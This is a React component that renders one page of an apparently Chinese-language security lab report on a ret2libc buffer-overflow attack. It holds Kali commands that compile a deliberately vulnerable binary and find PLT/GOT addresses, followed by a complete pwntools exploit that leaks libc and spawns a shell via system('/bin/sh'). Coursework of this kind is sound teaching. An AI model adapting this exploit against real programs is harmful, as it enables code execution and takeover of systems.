import React from 'react';
import { A4Page } from '../shared';
import { KaliTerminal } from './Lab3Part1';

// 实验四 第十一部分 - ret2libc 类型3 完整实现
export const Lab4Part11: React.FC = () => (
    <A4Page id="lab4-part11">
        <p className="text-sm mb-2">步骤1：编译并获取关键地址</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab4]
└─$ gcc -m32 -g -fno-stack-protector -no-pie ret2libc2.c -o ret2libc2
┌──(kali㉿kali)-[~/lab4]
└─$ ldd ret2libc2 | grep libc
    libc.so.6 => /usr/lib32/libc.so.6 (0xf7c00000)
┌──(kali㉿kali)-[~/lab4]
└─$ objdump -d ret2libc2 | grep "<write@plt>:"
08049050 <write@plt>:
┌──(kali㉿kali)-[~/lab4]
└─$ objdump -R ret2libc2 | grep write
0804c008 R_386_JUMP_SLOT   write@GLIBC_2.0`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            write@plt 地址是 0x08049050，write@got 地址是 0x0804c008。
            攻击思路是：第一次溢出调用 write(1, write_got, 4) 泄露 write 函数的真实地址，
            然后返回到 dofunc 进行第二次溢出；根据泄露的地址计算 libc 基址，
            进而得到 system 和 "/bin/sh" 的地址；第二次溢出调用 system("/bin/sh")。
        </p>

        <p className="text-sm mb-2">步骤2：编写 exp 脚本（GOT 泄露 + 二次溢出）</p>
        <KaliTerminal>
{`# ret2libc2.py
from pwn import *

context(arch="i386", os="linux")
p = process("./ret2libc2")
elf = ELF("./ret2libc2")
libc = ELF("/usr/lib32/libc.so.6")

dofunc_addr = elf.sym["dofunc"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]
padding = 0x10 + 4

# payload1: 泄露 write 的 GOT 值，然后返回 dofunc 进行二次溢出
payload1 = b"a" * padding + p32(write_plt) + p32(dofunc_addr)
payload1 += p32(1) + p32(write_got) + p32(4)

p.sendafter(b"input:", payload1)

# 接收泄露的 write 地址
write_addr = u32(p.recv(4))
print(f"[+] write address: {hex(write_addr)}")

# 计算 system 和 /bin/sh 地址
libc_base = write_addr - libc.sym["write"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
print(f"[+] system address: {hex(system_addr)}")
print(f"[+] /bin/sh address: {hex(binsh_addr)}")

# payload2: 执行 system("/bin/sh")
payload2 = b"a" * padding + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
p.sendafter(b"input:", payload2)
p.interactive()`}
        </KaliTerminal>
    </A4Page>
);

export default Lab4Part11;
